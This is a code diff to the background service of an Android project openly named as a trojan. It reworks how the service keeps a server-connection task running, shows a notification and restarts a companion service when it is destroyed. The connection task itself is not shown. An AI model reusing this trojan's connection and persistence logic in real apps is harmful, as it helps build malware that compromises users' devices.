@@ -1,14 +1,17 @@
 package trojan.android.android_trojan.Action.Service;
 
+import android.app.ActivityManager;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
 import android.support.v4.app.NotificationCompat;
 import android.util.Log;
 
 import trojan.android.android_trojan.Action.AsyncTask.ConnectionServerTask;
+import trojan.android.android_trojan.Action.Tools;
 import trojan.android.android_trojan.R;
 
 
@@ -16,31 +19,43 @@ public class BackgroundService extends Service {
     private static final String TAG = "BackgroundService";
 
     private ConnectionServerTask connectionServerTask;
-
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
+    private int notificationid = 1;
+    private NotificationManager notificationManager;
 
     @Override
     public void onCreate() {
         super.onCreate();
         Log.d(TAG, "onCreate");
-        showRecordingNotification();
         connectionServerTask = new ConnectionServerTask(getApplicationContext());
-        connectionServerTask.execute();
+        notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        showNotification();
+        if (connectionServerTask.isCancelled() ||
+                !connectionServerTask.getStatus().toString().equals("RUNNING"))
+            connectionServerTask.execute();
         Log.d(TAG, connectionServerTask.getStatus().toString());
+        return super.onStartCommand(intent, flags, startId);
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
         connectionServerTask.cancel(true);
-        Log.d(TAG, connectionServerTask.getStatus().toString());
+        notificationManager.cancel(notificationid);
+        if (Tools.isMyServiceRunning(NotificationService.class, getApplicationContext()))
+            startService(new Intent(this, NotificationService.class));
         Log.d(TAG, "onDestroy");
     }
 
-    private void showRecordingNotification(){
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    private void showNotification(){
         NotificationCompat.Builder mBuilder =
                 new NotificationCompat.Builder(this)
                         .setSmallIcon(R.drawable.ic_launcher)
@@ -54,9 +69,6 @@ public class BackgroundService extends Service {
 
         mBuilder.setContentIntent(resultPendingIntent);
 
-        int mNotificationId = 001;
-        NotificationManager mNotifyMgr =
-                (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-        mNotifyMgr.notify(mNotificationId, mBuilder.build());
+        notificationManager.notify(notificationid, mBuilder.build());
     }
 }
